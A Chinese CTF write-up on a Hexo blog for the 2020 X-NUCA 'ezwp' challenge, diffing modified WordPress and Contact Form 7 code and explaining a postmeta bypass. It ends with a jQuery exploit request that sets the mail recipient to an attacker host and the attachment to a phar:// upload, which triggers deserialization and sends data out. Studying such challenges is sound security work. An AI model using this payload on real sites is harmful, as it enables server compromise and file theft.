@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>2020xnuca_ezwp题解 | ccreaterのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="2020 xnuca ezwp题解wpscan扫一波发现wp是最新版本 本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这 漏洞分析：https:&#x2F;&#x2F;paper.seebug.org&#x2F;774&#x2F; 对wp和插件对比以下官方下载的，存在以下差异 文件对比wordpress&#x2F;wp-admin&#x2F;includes&#x2F;class-wp-screen.php 294行  官方 123456789">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020xnuca_ezwp题解">
+<meta property="og:url" content="https://site.ccreater.top/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="ccreaterのblog">
+<meta property="og:description" content="2020 xnuca ezwp题解wpscan扫一波发现wp是最新版本 本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这 漏洞分析：https:&#x2F;&#x2F;paper.seebug.org&#x2F;774&#x2F; 对wp和插件对比以下官方下载的，存在以下差异 文件对比wordpress&#x2F;wp-admin&#x2F;includes&#x2F;class-wp-screen.php 294行  官方 123456789">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png">
+<meta property="article:published_time" content="2020-12-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-01T16:05:50.683Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png">
+  
+    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">ccreaterのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time class="dt-published" datetime="2020-12-15T16:00:00.000Z" itemprop="datePublished">2020-12-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      2020xnuca_ezwp题解
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p>
+<p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p>
+<p>漏洞分析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/774/">https://paper.seebug.org/774/</a></p>
+<p>对wp和插件对比以下官方下载的，存在以下差异</p>
+<h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p>
+<hr>
+<p>官方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) &amp;&amp; isset( $_POST[&#x27;post_ID&#x27;] ) &amp;&amp; (int) $_GET[&#x27;post&#x27;] !== (int) $_POST[&#x27;post_ID&#x27;] ) &#123;</span><br><span class="line">						wp_die( __( &#x27;A post ID mismatch has been detected.&#x27; ), __( &#x27;Sorry, you are not allowed to edit this item.&#x27; ), 400 );</span><br><span class="line">					&#125; elseif ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">					&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						$post_id = 0;</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">					&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						$post_id = 0;</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p>
+<p>官方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空</span><br></pre></td></tr></table></figure>
+
+<p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( (stristr(file_get_contents($file[&#x27;tmp_name&#x27;]), &quot;php&quot;) !== FALSE) ) &#123;</span><br><span class="line">        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#x27;Sorry, this file content is not permitted for security reasons.&#x27; ) ) );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>/wp-admin/includes/post.php 221</p>
+<p>array_diff_key 参数少了’file’</p>
+<p>官方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return array_diff_key( $post_data, array_flip( array( &#x27;meta_input&#x27;, &#x27;file&#x27;, &#x27;guid&#x27; ) ) );</span><br></pre></td></tr></table></figure>
+
+<p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return array_diff_key( $post_data, array_flip( array( &#x27;meta_input&#x27;, &#x27;guid&#x27; ) ) );</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>wp-admin/post.php 19行，少了很多条件</p>
+<p>官方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) &amp;&amp; isset( $_POST[&#x27;post_ID&#x27;] ) &amp;&amp; (int) $_GET[&#x27;post&#x27;] !== (int) $_POST[&#x27;post_ID&#x27;] ) &#123;</span><br><span class="line">	wp_die( __( &#x27;A post ID mismatch has been detected.&#x27; ), __( &#x27;Sorry, you are not allowed to edit this item.&#x27; ), 400 );</span><br><span class="line">&#125; elseif ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$post_id = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$post_id = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function unserialize( $serialized ) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * @inheritdoc</span><br><span class="line">	 */</span><br><span class="line">	public function __unserialize( $serialized ) &#123; // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function __wakeup() &#123; // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound</span><br><span class="line">		unset( $this-&gt;callback );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    return wp_mail( $recipient, $subject, $body, $headers, $attachments );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function send_mail($to, $subject, $message, $headers = &#x27;&#x27;, $attachments = array()) &#123;</span><br><span class="line">	    try &#123;</span><br><span class="line">            $host = explode(&quot;@&quot;, $to)[1];</span><br><span class="line">            $url = &quot;http://$host&quot;;</span><br><span class="line">            $post_data = array(</span><br><span class="line">                &quot;subject&quot; =&gt; $subject,</span><br><span class="line">                &quot;message&quot; =&gt; $message,</span><br><span class="line">                &quot;headers&quot; =&gt; $headers</span><br><span class="line">            );</span><br><span class="line">            if ($attachments !== array()) &#123;</span><br><span class="line">                if (!empty($attachments[0])) &#123;</span><br><span class="line">                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch , CURLOPT_URL , $url);</span><br><span class="line">            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">            curl_setopt($ch , CURLOPT_POST, 1);</span><br><span class="line">			curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">			$data = curl_exec($ch);</span><br><span class="line">			curl_close($ch);</span><br><span class="line">			if ($data) &#123;</span><br><span class="line">				file_put_contents(&quot;/tmp/1.log&quot;, $data);</span><br><span class="line">			&#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (Exception $e) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p>
+<h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p>
+<p>/wp-admin/includes/post.php 221：</p>
+<p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) ); </code></p>
+<p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p>
+<p>/wp-admin/includes/post.php 872：</p>
+<p><code>add_meta( $post_ID );</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_meta</span>(<span class="params"> <span class="variable">$post_ID</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$post_ID</span> = (<span class="keyword">int</span>) <span class="variable">$post_ID</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$metakeyselect</span> = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyselect&#x27;</span>] ) ? wp_unslash( trim( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyselect&#x27;</span>] ) ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$metakeyinput</span>  = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyinput&#x27;</span>] ) ? wp_unslash( trim( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyinput&#x27;</span>] ) ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$metavalue</span>     = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metavalue&#x27;</span>] ) ? <span class="variable">$_POST</span>[<span class="string">&#x27;metavalue&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> ( is_string( <span class="variable">$metavalue</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$metavalue</span> = trim( <span class="variable">$metavalue</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ( ( <span class="string">&#x27;#NONE#&#x27;</span> !== <span class="variable">$metakeyselect</span> ) &amp;&amp; ! <span class="keyword">empty</span>( <span class="variable">$metakeyselect</span> ) ) || ! <span class="keyword">empty</span>( <span class="variable">$metakeyinput</span> ) ) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We have a key/value pair. If both the select and the input</span></span><br><span class="line"><span class="comment">		 * for the key have data, the input takes precedence.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="string">&#x27;#NONE#&#x27;</span> !== <span class="variable">$metakeyselect</span> ) &#123;</span><br><span class="line">			<span class="variable">$metakey</span> = <span class="variable">$metakeyselect</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$metakeyinput</span> ) &#123;</span><br><span class="line">			<span class="variable">$metakey</span> = <span class="variable">$metakeyinput</span>; <span class="comment">// Default.</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( is_protected_meta( <span class="variable">$metakey</span>, <span class="string">&#x27;post&#x27;</span> ) || ! current_user_can( <span class="string">&#x27;add_post_meta&#x27;</span>, <span class="variable">$post_ID</span>, <span class="variable">$metakey</span> ) ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$metakey</span> = wp_slash( <span class="variable">$metakey</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> add_post_meta( <span class="variable">$post_ID</span>, <span class="variable">$metakey</span>, <span class="variable">$metavalue</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p>
+<p>但是我们跟踪以下插件渲染表单的代码发现</p>
+<p>contact-form.php:129</p>
+<p>class WPCF7_ContactForm</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$post</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">		<span class="variable">$post</span> = get_post( <span class="variable">$post</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$post</span> &amp;&amp; <span class="built_in">self</span>::post_type == get_post_type( <span class="variable">$post</span> ) ) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;id = <span class="variable">$post</span>-&gt;ID;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = <span class="variable">$post</span>-&gt;post_name;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;title = <span class="variable">$post</span>-&gt;post_title;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;locale = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_locale&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">			<span class="variable">$properties</span> = <span class="keyword">$this</span>-&gt;get_properties();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">foreach</span> ( <span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line">				<span class="keyword">if</span> ( metadata_exists( <span class="string">&#x27;post&#x27;</span>, <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_&#x27;</span> . <span class="variable">$key</span> ) ) &#123;</span><br><span class="line">					<span class="variable">$properties</span>[<span class="variable">$key</span>] = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_&#x27;</span> . <span class="variable">$key</span>, <span class="literal">true</span> );</span><br><span class="line">				&#125; <span class="keyword">elseif</span> ( metadata_exists( <span class="string">&#x27;post&#x27;</span>, <span class="variable">$post</span>-&gt;ID, <span class="variable">$key</span> ) ) &#123;</span><br><span class="line">					<span class="variable">$properties</span>[<span class="variable">$key</span>] = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="variable">$key</span>, <span class="literal">true</span> );</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&gt;properties = <span class="variable">$properties</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;upgrade();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		do_action( <span class="string">&#x27;wpcf7_contact_form&#x27;</span>, <span class="keyword">$this</span> );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p>
+<p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p>
+<p>于是构造</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;async&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;crossDomain&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: <span class="built_in">document</span>.getElementById(<span class="string">&quot;_wpnonce&quot;</span>).value,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;%2Fwp-admin%2Fpost-new.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_ID&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="string">&quot;originalaction&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_author&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>: <span class="string">&quot;wpcf7_contact_form&quot;</span>,</span><br><span class="line">        <span class="string">&quot;original_post_status&quot;</span>: <span class="string">&quot;auto-draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;auto_draft&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_title&quot;</span>: <span class="string">&quot;readflagtotmp2log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wp-preview&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mm&quot;</span>: <span class="string">&quot;12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jj&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_thumbnail_id&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;advanced_view&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;comment_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ping_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metakeyinput&quot;</span>:<span class="string">&quot;mail&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[subject]&quot;</span>: <span class="string">&quot;test \&quot;[your-subject]\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[sender]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[recipient]&quot;</span>: <span class="string">&quot;ccreater@172.16.8.6:60000&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[body]&quot;</span>: <span class="string">&quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[additional_headers]&quot;</span>: <span class="string">&quot;Reply-To: [your-email]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[attachments]&quot;</span>: <span class="string">&quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[use_html]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[exclude_blank]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">		<span class="string">&quot;metakeyselect&quot;</span>:<span class="string">&quot;#NONE#&quot;</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
